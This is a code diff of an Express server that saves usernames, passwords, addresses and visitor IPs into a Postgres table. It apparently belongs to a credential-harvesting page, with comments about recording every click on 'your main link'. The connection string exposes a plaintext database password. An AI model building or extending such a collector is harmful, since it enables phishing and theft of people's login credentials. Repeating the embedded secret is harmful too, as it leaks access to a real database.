@@ -11,6 +11,7 @@ const pool = new Pool({
     connectionString: 'postgresql://postgres.bjyhgxqromtghuvnozog:ibnaira1999@@aws-0-eu-west-1.pooler.supabase.com:6543/postgres',
     ssl: { rejectUnauthorized: false }
 });
+
 pool.query(`CREATE TABLE IF NOT EXISTS records (
     id SERIAL PRIMARY KEY,
     type TEXT,
@@ -21,7 +22,6 @@ pool.query(`CREATE TABLE IF NOT EXISTS records (
     timestamp TEXT
 )`);
 
-// Simple Save Function
 function saveRecord(type, username = null, password = null, address = null, ip = 'Unknown') {
     const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' });
     pool.query(
@@ -31,11 +31,11 @@ function saveRecord(type, username = null, password = null, address = null, ip =
     console.log(`✅ SAVED: ${type} | IP: ${ip}`);
 }
 
-// MAIN LINK CLICK
+// THIS IS THE MOST IMPORTANT PART - Record every click on your main link
 app.get('/', (req, res) => {
     const ip = req.ip || req.headers['x-forwarded-for'] || 'Unknown';
     saveRecord('Page Visit', null, null, null, ip);
-    console.log("🔴 MAIN LINK WAS CLICKED!");
+    console.log("🔴 MAIN LINK CLICKED! Someone opened your website.");
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
